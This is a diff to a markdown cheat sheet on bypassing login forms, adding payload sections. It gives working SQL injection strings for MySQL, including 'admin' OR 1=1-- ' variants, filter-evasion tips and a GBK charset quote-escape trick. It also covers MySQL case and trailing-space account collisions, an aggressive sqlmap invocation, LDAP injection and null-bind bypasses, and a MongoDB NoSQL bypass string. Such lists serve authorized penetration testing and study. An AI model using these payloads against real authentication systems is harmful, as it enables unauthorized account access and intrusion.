@@ -1,5 +1,26 @@
 Login_form_bypass
 
+## SQLi
+
+### mysql
+
+`admin' OR 1=1-- `(don't forget the last space in mysql)
+
+- sometimes if you have multiple result it will not work, try
+
+`admin' OR 1=1 LIMIT 1-- `(don't forget the last space in mysql)
+
+- sometimes spaces are filtered, try with a tabulation (%09) 
+
+- you can also replace `--` by `#` if necessary (`%23`)
+
+- `OR` could be replace by `||`
+
+- `1=1` could be just `1`
+
+- GBK is a character set for simplified Chinese. Using the fact that the database driver and the database don't "talk" the same charset, it's possible to generate a single quote and break out of the SQL syntax to inject a payload. Using `\xBF'` url encoded `%bf%27`, you have a single quote that will not get escaped properly. It commes from the execution of this : `SET CHARACTER SET 'GBK';`
+
+
 ## SQL Truncate
 
 - Do not hesitate to retry multiple times
@@ -29,6 +50,15 @@ Use the intruder with a payloadallthethings file :
 Find payloads in this fabulous cheat sheet : https://portswigger.net/web-security/sql-injection/cheat-sheet
 
 
+---
+
+## MySQL bypass login form
+
+- By default, MySQLL will perform a case insensitive comparison, so admin Admin and AdMin are the same account. When a user is created, the comparison could be done programatically, but when you try to login, the comparison is done by the database. Try to create AdMin !
+- Another test: mysql ignores traling space (admin[space])
+
+---
+
 ## SQLMap (USE AT YOUR OWN RISK !)
 
 - Intercept your request with burpsuite and then run sqlmap on it : ```sqlmap -level=5 -risk=3 -p username -r \<yourfile\>``` 
@@ -43,11 +73,28 @@ Find payloads in this fabulous cheat sheet : https://portswigger.net/web-securit
 
 ---
 
+## LDAP
+
+- Some LDAP servers authorise NULL Bind. Try to remove all the data in the post request to see if you manage to authenticate.
+
+- Knowing the syntax of LDAP, you can try to abuse it : `username=<user>&password=<password>`
+(&(username=<user>)(password=<password>))
+So, to bypass this :
+(&(username=test)(cn=*)NULL byte)
+`hacker)(cn=*))%00`
+
+- Try also just * in login and password
+
+https://book.hacktricks.xyz/pentesting-web/ldap-injection
+
+---
+
 ## What can it be ?
 
 - MySQL
 - MSSQL
-- NoSQL
+- NoSQL (MongoDB, for example for a login bypass : `' || 1==1%00'`
+) (To comment the end : `%00`, `//`, `<!--`)
 - XPATH
 
 For each one, refer to the cheat sheet.
